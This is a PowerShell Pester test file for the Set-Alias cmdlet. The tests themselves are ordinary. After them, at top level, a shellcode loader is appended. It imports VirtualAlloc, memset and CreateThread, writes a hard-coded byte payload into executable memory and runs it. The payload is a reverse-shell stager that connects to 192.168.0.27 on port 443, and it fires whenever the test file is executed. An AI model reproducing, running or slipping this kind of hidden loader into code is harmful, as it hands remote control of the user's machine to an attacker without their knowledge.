


Describe "Set-Alias DRT Unit Tests" -Tags "CI" {
	It "Set-Alias Invalid Scope Name should throw PSArgumentException"{
			{ Set-Alias -Name "ABCD" -Value "foo" -Scope "bogus" } | Should -Throw -ErrorId "Argument,Microsoft.PowerShell.Commands.SetAliasCommand"
	}

	It "Set-Alias ReadOnly Force"{
			Set-Alias -Name ABCD -Value "foo" -Option ReadOnly -Force:$true
			$result=Get-Alias -Name ABCD
			$result.Name| Should -BeExactly "ABCD"
			$result.Definition| Should -BeExactly "foo"
			$result.Description| Should -BeNullOrEmpty
			$result.Options| Should -BeExactly "ReadOnly"

			Set-Alias -Name ABCD -Value "foo" -Force:$true
			$result=Get-Alias -Name ABCD
			$result.Name| Should -BeExactly "ABCD"
			$result.Definition| Should -BeExactly "foo"
			$result.Description| Should -BeNullOrEmpty
			$result.Options| Should -BeExactly "None"
	}

	It "Set-Alias Name And Value Valid"{
			Set-Alias -Name ABCD -Value "MyCommand"
			$result=Get-Alias -Name ABCD
			$result.Name| Should -BeExactly "ABCD"
			$result.Definition| Should -BeExactly "MyCommand"
			$result.Description| Should -BeNullOrEmpty
			$result.Options| Should -BeExactly "None"
	}
	It "Set-Alias Name And Value Positional Valid"{
			Set-Alias -Name ABCD "foo"
			$result=Get-Alias ABCD
			$result.Name| Should -BeExactly "ABCD"
			$result.Definition| Should -BeExactly "foo"
			$result.Description| Should -BeNullOrEmpty
			$result.Options| Should -BeExactly "None"
	}
	It "Set-Alias Description Valid"{
			Set-Alias -Name ABCD -Value "MyCommand" -Description "test description"
			$result=Get-Alias -Name ABCD
			$result.Name| Should -BeExactly "ABCD"
			$result.Definition| Should -BeExactly "MyCommand"
			$result.Description| Should -BeExactly "test description"
			$result.Options| Should -BeExactly "None"
	}
	It "Set-Alias Scope Valid"{
			Set-Alias -Name ABCD -Value "localfoo" -scope local -Force:$true
			Set-Alias -Name ABCD -Value "foo1" -scope "1" -Force:$true

			$result=Get-Alias -Name ABCD
			$result.Name| Should -BeExactly "ABCD"
			$result.Definition| Should -BeExactly "localfoo"
			$result.Description| Should -BeNullOrEmpty
			$result.Options| Should -BeExactly "None"

			$result=Get-Alias -Name ABCD -scope local
			$result.Name| Should -BeExactly "ABCD"
			$result.Definition| Should -BeExactly "localfoo"
			$result.Description| Should -BeNullOrEmpty
			$result.Options| Should -BeExactly "None"

			$result=Get-Alias -Name ABCD -scope "1"
			$result.Name| Should -BeExactly "ABCD"
			$result.Definition| Should -BeExactly "foo1"
			$result.Description| Should -BeNullOrEmpty
			$result.Options| Should -BeExactly "None"
	}
	It "Set-Alias Expose Bug 1062958, BugId:905449"{
			{ Set-Alias -Name "ABCD" -Value "foo" -Scope "-1" } | Should -Throw -ErrorId "ArgumentOutOfRange,Microsoft.PowerShell.Commands.SetAliasCommand"
	}
}

Describe "Set-Alias" -Tags "CI" {
    Mock Get-Date { return "Friday, October 30, 2015 3:38:08 PM" }
    It "Should be able to set alias without error" {

	{ set-alias -Name gd -Value Get-Date } | Should -Not -Throw
    }

    It "Should be able to have the same output between set-alias and the output of the function being aliased" {
	set-alias -Name gd -Value Get-Date
	gd | Should -Be $(Get-Date)
    }

    It "Should be able to use the sal alias" {
	{ sal gd Get-Date } | Should -Not -Throw
    }

    It "Should have the same output between the sal alias and the original set-alias cmdlet" {
	sal -Name gd -Value Get-Date

	Set-Alias -Name gd2 -Value Get-Date

	gd2 | Should -Be $(gd)
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x1b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

